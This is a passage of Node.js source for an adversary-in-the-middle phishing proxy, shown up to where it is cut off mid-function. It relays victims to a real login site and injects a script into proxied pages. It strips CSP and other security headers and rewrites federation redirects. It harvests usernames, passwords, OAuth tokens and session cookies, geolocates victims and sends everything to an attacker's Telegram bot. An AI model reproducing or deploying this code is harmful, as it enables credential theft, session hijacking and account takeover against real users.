const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");

// ==================== UTILITY: ESCAPE MARKDOWN ====================
function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

// ==================== CONFIGURATION ====================
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico",
    fingerprint: "/fingerprint"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
try {
    if (!fs.existsSync(LOGS_DIRECTORY)) {
        fs.mkdirSync(LOGS_DIRECTORY);
    }
} catch (error) {
    displayError("Directory creation failed", error, LOGS_DIRECTORY);
}
const LOG_FILE_STREAMS = {};
const ENCRYPTION_KEY = "Svrps-M3g4_S3cURe-EnC4YpT10n_k3Y";

const VICTIM_SESSIONS = {};

// ==================== TELEGRAM INTEGRATION ====================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_BATCH_INTERVAL_MS = 60000; // 1 minute
const TELEGRAM_BATCH_MAX_SIZE = 10;
let telegramBatch = [];
let telegramBatchTimer = null;

async function sendTelegramMessage(text) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "") {
        console.warn("Telegram bot token not set. Skipping message.");
        return;
    }
    // First attempt with Markdown
    let payload = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text.slice(0, 4096),
        parse_mode: "Markdown",
        disable_web_page_preview: true
    });
    let options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload)
        }
    };

    try {
        await new Promise((resolve, reject) => {
            const req = https.request(TELEGRAM_API_URL, options, (res) => {
                let data = "";
                res.on("data", chunk => data += chunk);
                res.on("end", () => {
                    if (res.statusCode === 200) {
                        resolve();
                    } else if (res.statusCode === 400 && data.includes("can't parse entities")) {
                        // Retry without Markdown parsing
                        console.warn("Markdown parse error, retrying without parse_mode");
                        const fallbackPayload = JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: text.slice(0, 4096),
                            disable_web_page_preview: true
                        });
                        const fallbackOptions = {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                "Content-Length": Buffer.byteLength(fallbackPayload)
                            }
                        };
                        const fallbackReq = https.request(TELEGRAM_API_URL, fallbackOptions, (fbRes) => {
                            let fbData = "";
                            fbRes.on("data", chunk => fbData += chunk);
                            fbRes.on("end", () => {
                                if (fbRes.statusCode === 200) {
                                    resolve();
                                } else {
                                    reject(new Error(`Fallback failed: ${fbRes.statusCode} ${fbData}`));
                                }
                            });
                        });
                        fallbackReq.on("error", reject);
                        fallbackReq.write(fallbackPayload);
                        fallbackReq.end();
                    } else {
                        reject(new Error(`Status ${res.statusCode} ${data}`));
                    }
                });
            });
            req.on("error", reject);
            req.write(payload);
            req.end();
        });
    } catch (error) {
        displayError("Telegram sendMessage failed", error, text.substring(0, 200));
    }
}

async function flushTelegramBatch() {
    if (telegramBatch.length === 0) return;
    const batchCopy = telegramBatch.slice();
    telegramBatch = [];
    const message = `📦 *Batch (${batchCopy.length} logs)*\n\n${batchCopy.join("\n---\n")}`;
    await sendTelegramMessage(message);
}

async function queueTelegramLog(logEntry) {
    if (TELEGRAM_BATCH_INTERVAL_MS > 0) {
        telegramBatch.push(logEntry);
        if (telegramBatch.length >= TELEGRAM_BATCH_MAX_SIZE) {
            await flushTelegramBatch();
        }
        if (!telegramBatchTimer) {
            telegramBatchTimer = setTimeout(() => {
                telegramBatchTimer = null;
                flushTelegramBatch().catch(e => displayError("Batch flush error", e));
            }, TELEGRAM_BATCH_INTERVAL_MS);
        }
    } else {
        await sendTelegramMessage(logEntry);
    }
}

// ==================== GEO-LOCATION (with cache) ====================
const geoCache = new Map();
const GEO_API_URL = "https://ip-api.com/json/"; // FIXED: changed to https

async function getGeoLocation(ip) {
    if (!ip) return null;
    if (geoCache.has(ip)) return geoCache.get(ip);
    try {
        const url = `${GEO_API_URL}${ip}?fields=status,message,country,regionName,city,isp,lat,lon,timezone`;
        const data = await new Promise((resolve, reject) => {
            https.get(url, (res) => {
                let raw = "";
                res.on("data", chunk => raw += chunk);
                res.on("end", () => {
                    try { resolve(JSON.parse(raw)); } catch (e) { reject(e); }
                });
            }).on("error", reject);
        });
        if (data.status === "success") {
            const result = {
                country: data.country,
                region: data.regionName,
                city: data.city,
                isp: data.isp,
                lat: data.lat,
                lon: data.lon,
                timezone: data.timezone
            };
            geoCache.set(ip, result);
            return result;
        }
        geoCache.set(ip, null);
        return null;
    } catch (e) {
        displayError("Geo-location API error", e, ip);
        geoCache.set(ip, null);
        return null;
    }
}

// ==================== CREDENTIAL EXTRACTOR (Request) ====================
function extractCredentials(body) {
    if (!body) return null;
    let parsed = null;
    let raw = typeof body === "string" ? body : JSON.stringify(body);
    try {
        parsed = JSON.parse(raw);
    } catch {
        try {
            parsed = Object.fromEntries(new URLSearchParams(raw));
        } catch {
            parsed = { raw: raw };
        }
    }
    const credentialFields = ["username", "user", "email", "login", "userid", "password", "pass", "pwd", "passwd", "secret", "token", "accesstoken", "refresh_token"];
    const found = {};
    for (const key of credentialFields) {
        const lowerKey = key.toLowerCase();
        for (const [k, v] of Object.entries(parsed)) {
            if (k.toLowerCase().includes(lowerKey) || lowerKey.includes(k.toLowerCase())) {
                if (v && typeof v === "string" && v.length > 0 && v.length < 500) {
                    found[k] = v;
                }
            }
        }
    }
    return Object.keys(found).length ? found : null;
}

// ==================== RESPONSE TOKEN EXTRACTOR ====================
function extractResponseTokens(body, contentType) {
    if (!body) return null;
    let parsed = null;
    try {
        if (contentType && contentType.includes('application/json')) {
            parsed = typeof body === 'string' ? JSON.parse(body) : body;
        } else {
            const str = body.toString();
            const tokenPatterns = {
                'access_token': /["']access_token["']\s*:\s*["']([^"']+)["']/i,
                'refresh_token': /["']refresh_token["']\s*:\s*["']([^"']+)["']/i,
                'code': /["']code["']\s*:\s*["']([^"']+)["']/i,
                'id_token': /["']id_token["']\s*:\s*["']([^"']+)["']/i,
                'session_state': /["']session_state["']\s*:\s*["']([^"']+)["']/i,
                'state': /["']state["']\s*:\s*["']([^"']+)["']/i,
                'token': /["']token["']\s*:\s*["']([^"']+)["']/i,
            };
            const found = {};
            for (const [name, regex] of Object.entries(tokenPatterns)) {
                const match = str.match(regex);
                if (match) found[name] = match[1];
            }
            return Object.keys(found).length ? found : null;
        }
    } catch (e) {
        return null;
    }
    const tokenFields = ['access_token', 'refresh_token', 'id_token', 'code', 'session_state', 'state', 'token'];
    const found = {};
    for (const field of tokenFields) {
        if (parsed && parsed[field]) {
            found[field] = parsed[field];
        }
    }
    return Object.keys(found).length ? found : null;
}

// ==================== EXISTING UTILITY FUNCTIONS ====================
function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name ?? error}`);
    console.error(`Message: ${error.message}`);
    console.error(`Stack trace: ${error.stack}`);
    for (let i = 0; i < args.length; i++) {
        console.error(`Parameter ${i + 1}: ${args[i]}`);
    }
    console.error("******************************");
}

function getUserSession(requestCookies) {
    if (!requestCookies) return;
    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");
        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);
    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);
    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];
        cipher.on("error", reject)
               .on("data", chunk => encryptedData.push(chunk))
               .on("end", () => resolve({
                    iv: iv.toString("hex"),
                    encryptedData: Buffer.concat(encryptedData).toString("hex")
               }));
        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession, clientRequest) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];
    const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));
    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }

    // ---------- TELEGRAM ENHANCED LOGGING ----------
    try {
        let clientIP = clientRequest.socket.remoteAddress;
        const forwarded = clientRequest.headers["x-forwarded-for"];
        if (forwarded) {
            const forwardedIPs = forwarded.split(",").map(ip => ip.trim());
            clientIP = forwardedIPs[0] || clientIP;
        }
        if (clientIP && clientIP.startsWith("::ffff:")) {
            clientIP = clientIP.substring(7);
        }

        const userAgent = clientRequest.headers["user-agent"] || "unknown";
        const geo = await getGeoLocation(clientIP);
        let geoStr = "N/A";
        if (geo) {
            geoStr = `${geo.city}, ${geo.region}, ${geo.country} (${geo.isp}) [${geo.lat},${geo.lon}]`;
        }

        let summary = 
`🕒 *${escapeMarkdown(httpProxyTransaction.timestamp)}*
🌐 *${escapeMarkdown(httpProxyTransaction.proxyRequestMethod)}* ${escapeMarkdown(httpProxyTransaction.proxyRequestURL)}
📊 Status: ${httpProxyTransaction.proxyResponseStatusCode}
📦 Session: ${escapeMarkdown(currentSession)}
📁 Host: ${escapeMarkdown(proxyRequestOptions.headers.host)}
👤 *Client IP:* ${escapeMarkdown(clientIP || "unknown")}
📍 *Geo:* ${escapeMarkdown(geoStr)}
📱 *User-Agent:* ${escapeMarkdown(userAgent)}
🍪 Cookies: ${proxyRequestOptions.headers.cookie ? "✅ present" : "❌ none"}`;

        // Critical Headers
        const criticalHeaders = ['accept-language', 'sec-ch-ua', 'sec-ch-ua-platform', 'sec-fetch-site', 'sec-fetch-mode', 'origin', 'referer'];
        let headerStr = '';
        for (const h of criticalHeaders) {
            if (clientRequest.headers[h]) headerStr += `\n📎 *${escapeMarkdown(h)}*: \`${escapeMarkdown(clientRequest.headers[h])}\``;
        }
        if (headerStr) summary += `\n\n📋 *CRITICAL HEADERS:*${headerStr}`;

        // URL Parameters
        try {
            const urlObj = new URL(`${proxyRequestProtocol}//${clientRequest.headers.host}${clientRequest.url}`);
            const queryParams = Object.fromEntries(urlObj.searchParams);
            if (Object.keys(queryParams).length) {
                const qStr = Object.entries(queryParams).map(([k,v]) => `🔗 *${escapeMarkdown(k)}*: \`${escapeMarkdown(v)}\``).join("\n");
                summary += `\n\n🔍 *URL PARAMETERS:*\n${qStr}`;
            }
        } catch {}

        // All session cookies - with date validation
        const allCookies = VICTIM_SESSIONS[currentSession]?.cookies || [];
        if (allCookies.length) {
            const cookieStr = allCookies.map(c => {
                let expiresStr = 'unknown';
                if (c.expires && !isNaN(c.expires) && isFinite(c.expires)) {
                    try {
                        expiresStr = new Date(c.expires).toISOString();
                    } catch (_) { expiresStr = 'invalid'; }
                }
                return `🍪 *${escapeMarkdown(c.name)}* = \`${escapeMarkdown(c.value)}\` (domain: ${escapeMarkdown(c.domain)}, path: ${escapeMarkdown(c.path)}, expires: ${escapeMarkdown(expiresStr)})`;
            }).join("\n");
            summary += `\n\n📦 *SESSION COOKIES (${allCookies.length}):*\n${cookieStr}`;
        }

        // Auth tokens from headers
        const authHeaders = ['authorization', 'x-api-key', 'x-csrf-token', 'x-xsrf-token', 'x-requested-with'];
        let authStr = '';
        for (const h of authHeaders) {
            if (clientRequest.headers[h]) authStr += `\n🔐 *${escapeMarkdown(h)}*: \`${escapeMarkdown(clientRequest.headers[h])}\``;
        }
        if (authStr) summary += `\n\n🛡️ *AUTH TOKENS:*${authStr}`;

        // Request body and extracted credentials
        if (proxyRequestBody) {
            let bodyStr = typeof proxyRequestBody === "string" ? proxyRequestBody : JSON.stringify(proxyRequestBody);
            if (bodyStr.length > 200) bodyStr = bodyStr.substring(0, 200) + "... (truncated)";
            summary += `\n\n📦 *Request Body:*\n\`\`\`\n${escapeMarkdown(bodyStr)}\n\`\`\``;

            const creds = extractCredentials(proxyRequestBody);
            if (creds) {
                const credStr = Object.entries(creds).map(([k, v]) => `🔑 *${escapeMarkdown(k)}*: \`${escapeMarkdown(v)}\``).join("\n");
                summary += `\n\n🔥 *EXTRACTED CREDENTIALS:*\n${credStr}`;
            }
        }

        // Redirect location
        if (proxyResponse.headers.location) {
            summary += `\n\n↪️ *Redirect Location:* \`${escapeMarkdown(proxyResponse.headers.location)}\``;
        }

        // Timing
        const startTime = clientRequest._startTime || Date.now();
        const duration = Date.now() - startTime;
        summary += `\n\n⏱️ *Request duration:* ${duration}ms`;

        await queueTelegramLog(summary);
    } catch (e) {
        displayError("Telegram enhanced logging error", e);
    }
}

// ==================== DOMAIN / PATH HELPERS ====================
function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const splitRequestHostname = requestHostname.split(".");
    const splitCookieDomain = cookieDomain.split(".");
    if (splitCookieDomain.length < 2) return false;
    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) return false;
    if (splitRequestHostname.length < splitCookieDomain.length) return false;
    for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) return false;
    }
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const splitRequestPath = requestPath.split("/");
    const splitCookiePath = cookiePath.split("/");
    if (cookiePath === "/") return true;
    if (splitRequestPath.length < splitCookiePath.length) return false;
    for (let i = 1, l = splitCookiePath.length; i < l; i++) {
        if (splitCookiePath[i] !== splitRequestPath[i]) return false;
    }
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
           isPathApplicable(requestOptions.path, cookie.path);
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const proxyRequestCookies = {};
    const currentTimestamp = Date.now();
    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            proxyRequestCookies[cookie.name] = cookie.value;
        }
    }
    return Object.entries(proxyRequestCookies)
        .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
        .join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false, foundDay = false, foundMonth = false, foundYear = false;
    let hourValue, minuteValue, secondValue;
    let dayValue, monthValue, yearValue;
    const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
    const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);
    for (const token of dateTokens) {
        if (!foundTime) {
            const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
            if (timeMatch) {
                foundTime = true;
                hourValue = parseInt(timeMatch[1]);
                minuteValue = parseInt(timeMatch[2]);
                secondValue = parseInt(timeMatch[3]);
                continue;
            }
        }
        if (!foundDay) {
            const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);
            if (dayMatch) {
                foundDay = true;
                dayValue = parseInt(dayMatch[1]);
                continue;
            }
        }
        if (!foundMonth) {
            const monthLowerCase = token.toLowerCase();
            const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];
            for (let i = 0; i < months.length; i++) {
                if (monthLowerCase.startsWith(months[i])) {
                    foundMonth = true;
                    monthValue = i;
                    break;
                }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
            if (yearMatch) {
                foundYear = true;
                yearValue = parseInt(yearMatch[1]);
                continue;
            }
        }
    }
    if (yearValue >= 70 && yearValue <= 99) yearValue += 1900;
    else if (yearValue >= 0 && yearValue <= 69) yearValue += 2000;
    if (!foundDay || !foundMonth || !foundYear || !foundTime) return NaN;
    if (dayValue < 1 || dayValue > 31) return NaN;
    if (yearValue < 1601) return NaN;
    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) return NaN;
    const parsedCookieDate = new Date(Date.UTC(yearValue, monthValue, dayValue, hourValue, minuteValue, secondValue));
    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
        parsedCookieDate.getUTCMonth() !== monthValue ||
        parsedCookieDate.getUTCDate() !== dayValue) return NaN;
    return parsedCookieDate.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const currentTimestamp = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) {
        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
    }
    for (const newCookie of newCookies) {
        const [cookie, ...attributes] = newCookie.split(";");
        const [cookieName, ...cookieValue] = cookie.split("=");
        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isCookieValid = true;
        for (const attribute of attributes) {
            const cookieAttribute = attribute.trim();
            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);
            if (cookieAttribute.toLowerCase() === "domain") {
                cookieDomain = request.hostname;
                cookieHostOnly = true;
                isCookieValid = true;
            }
            else if (cookieAttribute.toLowerCase() === "path") {
                cookiePath = (pathNameMatch ?? ["/"])[0];
            }
            else if (cookieAttribute.toLowerCase() === "expires") {
                cookieExpires = NaN;
            }
            else if (cookieAttribute.toLowerCase() === "max-age") {
                cookieMaxAge = "";
            }
            else if (cookieDomainMatch) {
                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                cookieHostOnly = true;
                isCookieValid = true;
                if (!cookieDomain) cookieDomain = request.hostname;
                else if (cookieDomain === proxyHostname) {
                    cookieDomain = request.hostname;
                    cookieHostOnly = false;
                }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    }
                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
                        isCookieValid = false;
                        continue;
                    }
                    cookieHostOnly = false;
                }
            }
            else if (cookiePathMatch) {
                cookiePath = cookiePathMatch[1].trim();
                if (!cookiePath.startsWith("/")) {
                    cookiePath = (pathNameMatch ?? ["/"])[0];
                }
            }
            else if (cookieExpiresMatch) {
                cookieExpires = cookieExpiresMatch[1].trim();
                cookieExpires = parseCookieDate(cookieExpires);
            }
            else if (cookieMaxAgeMatch) {
                cookieMaxAge = cookieMaxAgeMatch[1].trim();
                if (!/^-?\d+$/.test(cookieMaxAge)) cookieMaxAge = "";
            }
        }
        if (!isCookieValid) continue;
        cookieExpires += clockSkew;
        if (cookieMaxAge) {
            const seconds = parseInt(cookieMaxAge);
            if (!isNaN(seconds)) {
                cookieExpires = currentTimestamp + seconds * 1000;
            }
        }
        let isNewCookie = true;
        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];
            if (sessionCookie.name === cookieName &&
                sessionCookie.domain === cookieDomain &&
                sessionCookie.path === cookiePath &&
                sessionCookie.hostOnly === cookieHostOnly) {
                if (currentTimestamp > cookieExpires) {
                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
                    break;
                }
                sessionCookie.value = cookieValue.join("=");
                sessionCookie.expires = cookieExpires;
                isNewCookie = false;
                break;
            }
        }
        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
            VICTIM_SESSIONS[currentSession].cookies.push({
                name: cookieName,
                value: cookieValue.join("="),
                domain: cookieDomain,
                path: cookiePath,
                expires: cookieExpires,
                hostOnly: cookieHostOnly
            });
        }
    }
}

function getValidDomains(domains) {
    const validDomains = [];
    for (const domain of domains) {
        const splitDomain = domain.split(".");
        for (let i = 2; i < splitDomain.length + 1; i++) {
            const validDomain = splitDomain.slice(-i).join(".");
            if (!validDomains.includes(validDomain)) validDomains.push(validDomain);
        }
    }
    return validDomains;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHTTPRequestHeaders = [
        "max-forwards", "x-arr-log-id", "client-ip", "disguised-host",
        "x-site-deployment-id", "was-default-hostname", "x-forwarded-proto",
        "x-appservice-proto", "x-arr-ssl", "x-forwarded-tlsversion",
        "x-forwarded-for", "x-original-url", "x-waws-unencoded-url",
        "x-client-ip", "x-client-port"
    ];
    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
    if (Object.keys(proxyRequestCookies).length) {
        proxyRequestOptions.headers.cookie = proxyRequestCookies;
    } else {
        delete proxyRequestOptions.headers.cookie;
    }
    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
        delete proxyRequestOptions.headers.referer;
    }
    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHTTPRequestHeaders.includes(key)) {
            delete proxyRequestOptions.headers[key];
        } else {
            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
        }
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const httpSecurityResponseHeaders = [
        "x-frame-options", "x-xss-protection", "x-content-type-options",
        "set-cookie", "content-security-policy", "content-security-policy-report-only",
        "cross-origin-opener-policy", "cross-origin-embedder-policy",
        "cross-origin-resource-policy", "permissions-policy", "service-worker-allowed"
    ];
    for (const header of httpSecurityResponseHeaders) {
        delete headers[header];
    }
}

function decompressData(compressedData, encoding) {
    const decompressionAlgorithms = {
        gzip: zlib.gunzip, "x-gzip": zlib.gunzip,
        deflate: zlib.inflate, br: zlib.brotliDecompress,
        zstd: zlib.zstdDecompress
    };
    return new Promise((resolve, reject) => {
        const decompressionAlgorithm = decompressionAlgorithms[encoding];
        if (decompressionAlgorithm) {
            decompressionAlgorithm(compressedData, (error, decompressedData) => {
                if (error) reject(error);
                else resolve(decompressedData);
            });
        } else {
            resolve(compressedData);
        }
    });
}

function compressData(decompressedData, encoding) {
    const compressionAlgorithms = {
        gzip: zlib.gzip, "x-gzip": zlib.gzip,
        deflate: zlib.deflate, br: zlib.brotliCompress,
        zstd: zlib.zstdCompress
    };
    return new Promise((resolve, reject) => {
        const compressionAlgorithm = compressionAlgorithms[encoding];
        if (compressionAlgorithm) {
            compressionAlgorithm(decompressedData, (error, compressedData) => {
                if (error) reject(error);
                else resolve(compressedData);
            });
        } else {
            resolve(decompressedData);
        }
    });
}

async function decompressResponseBody(compressedData, contentEncoding) {
    if (!contentEncoding) return { decompressedResponseBody: compressedData, encodings: [] };
    const encodings = contentEncoding.split(",").map(encoding => encoding.trim().toLowerCase()).filter(encoding => encoding);
    let decompressedData = compressedData;
    for (let i = encodings.length - 1; i >= 0; i--) {
        decompressedData = await decompressData(decompressedData, encodings[i]);
    }
    return { decompressedResponseBody: decompressedData, encodings: encodings };
}

async function compressResponseBody(decompressedData, encodings) {
    let compressedData = decompressedData;
    for (const encoding of encodings) {
        compressedData = await compressData(compressedData, encoding);
    }
    return compressedData;
}

function updateHTMLProxyResponse(decompressedResponseBody) {
    const payload = "<script src=/@></script>";
    const htmlInjectionMap = {
        "<head>": `<head>${payload}`,
        "<html>": `<html><head>${payload}</head>`,
        "<body>": `<head>${payload}</head><body>`
    };
    const indexLimit = 200;
    for (const [key, value] of Object.entries(htmlInjectionMap)) {
        const htmlTagBuffer = Buffer.from(key);
        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);
        if (injectionPointIndex !== -1) {
            return Buffer.concat([
                decompressedResponseBody.subarray(0, injectionPointIndex),
                Buffer.from(value),
                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
            ]);
        }
    }
    return Buffer.concat([
        Buffer.from(`<head>${payload}</head>`),
        decompressedResponseBody
    ]);
}

function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
    const decompressedResponseBodyString = decompressedResponseBody.toString();
    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
    const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;
    const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
    return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
}

// ==================== MAIN PROXY SERVER ====================
const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    // Fingerprint endpoint
    if (url === PROXY_PATHNAMES.fingerprint) {
        let body = '';
        clientRequest.on('data', chunk => body += chunk);
        clientRequest.on('end', () => {
            try {
                const fp = JSON.parse(body);
                const summary = `🖥️ *FINGERPRINT:*\n${Object.entries(fp).map(([k,v]) => `🔹 *${k}*: \`${v}\``).join('\n')}`;
                queueTelegramLog(summary).catch(e => displayError("Fingerprint Telegram error", e));
                clientResponse.writeHead(200, { "Content-Type": "text/plain" });
                clientResponse.end('ok');
            } catch(e) {
                displayError("Fingerprint parse error", e);
                clientResponse.writeHead(400);
                clientResponse.end('invalid');
            }
        });
        return;
    }

    // ---- NORMAL PROXY FLOW ----
    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;
            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;

            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
        } catch (error) {
            displayError("Phishing URL parsing failed", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
    } else if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
            fs.createReadStream(url.slice(1)).pipe(clientResponse);
        } else if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            clientResponse.end();
        } else {
            let clientRequestBody = [];
            clientRequest.on("error", (error) => {
